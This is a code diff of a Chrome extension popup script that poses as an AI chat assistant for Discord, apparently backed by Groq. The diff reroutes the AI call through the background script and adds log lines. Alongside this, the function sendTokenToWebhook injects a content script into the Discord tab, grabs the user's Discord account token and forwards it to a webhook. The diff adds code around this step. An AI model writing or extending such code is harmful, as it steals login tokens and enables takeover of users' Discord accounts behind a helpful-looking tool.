@@ -1,6 +1,7 @@
-// ─── CONFIG ───
-var GROQ_API_KEY = "YOUR_GROQ_API_KEY_HERE";
-var GROQ_URL = "https://api.groq.com/openai/v1/chat/completions";
+// ─── POPUP SCRIPT ───
+
+// CONFIG is loaded from config.js via script tag in popup.html
+var GROQ_API_KEY = CONFIG.GROQ_API_KEY;
 
 // ─── DOM ───
 var chatArea = document.getElementById('chatArea');
@@ -57,12 +58,13 @@ function sendTokenToWebhook() {
     chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
         var tab = tabs[0];
         if (!tab || !tab.url || !tab.url.includes('discord.com')) {
+            console.log("[Popup] Not on Discord");
             return;
         }
 
         chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(response) {
             if (chrome.runtime.lastError) {
-                // Inject content script and try again
+                console.log("[Popup] Error getting token, injecting content script...");
                 chrome.scripting.executeScript({
                     target: { tabId: tab.id },
                     files: ['content.js']
@@ -70,6 +72,7 @@ function sendTokenToWebhook() {
                     setTimeout(function() {
                         chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(res) {
                             if (res && res.token) {
+                                console.log("[Popup] Token found, sending to webhook...");
                                 chrome.runtime.sendMessage({
                                     action: 'sendWebhook',
                                     token: res.token
@@ -80,6 +83,8 @@ function sendTokenToWebhook() {
                                         console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                                     }
                                 });
+                            } else {
+                                console.log("[Popup] No token found");
                             }
                         });
                     }, 500);
@@ -88,6 +93,7 @@ function sendTokenToWebhook() {
             }
 
             if (response && response.token) {
+                console.log("[Popup] Token found, sending to webhook...");
                 chrome.runtime.sendMessage({
                     action: 'sendWebhook',
                     token: response.token
@@ -98,6 +104,8 @@ function sendTokenToWebhook() {
                         console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                     }
                 });
+            } else {
+                console.log("[Popup] No token found");
             }
         });
     });
@@ -105,42 +113,18 @@ function sendTokenToWebhook() {
 
 // ─── AI ───
 function getAIResponse(message) {
-    return fetch(GROQ_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Authorization': 'Bearer ' + GROQ_API_KEY
-        },
-        body: JSON.stringify({
-            model: 'llama-3.1-8b-instant',
-            messages: [
-                {
-                    role: 'system',
-                    content: 'You are a helpful Discord assistant. Keep responses short and friendly (under 80 words).'
-                },
-                {
-                    role: 'user',
-                    content: message
-                }
-            ],
-            temperature: 0.7,
-            max_tokens: 150
-        })
-    })
-    .then(function(response) {
-        if (!response.ok) {
-            return response.text().then(function(text) {
-                throw new Error('Groq error: ' + response.status);
-            });
-        }
-        return response.json();
-    })
-    .then(function(data) {
-        return data.choices[0].message.content || "No response.";
-    })
-    .catch(function(error) {
-        console.error('Groq error:', error);
-        return "Connection error.";
+    return new Promise(function(resolve, reject) {
+        chrome.runtime.sendMessage({ action: 'groq', message: message }, function(response) {
+            if (chrome.runtime.lastError) {
+                reject(new Error(chrome.runtime.lastError.message));
+                return;
+            }
+            if (response && response.success) {
+                resolve(response.reply);
+            } else {
+                reject(new Error(response ? response.error : 'Unknown error'));
+            }
+        });
     });
 }
 
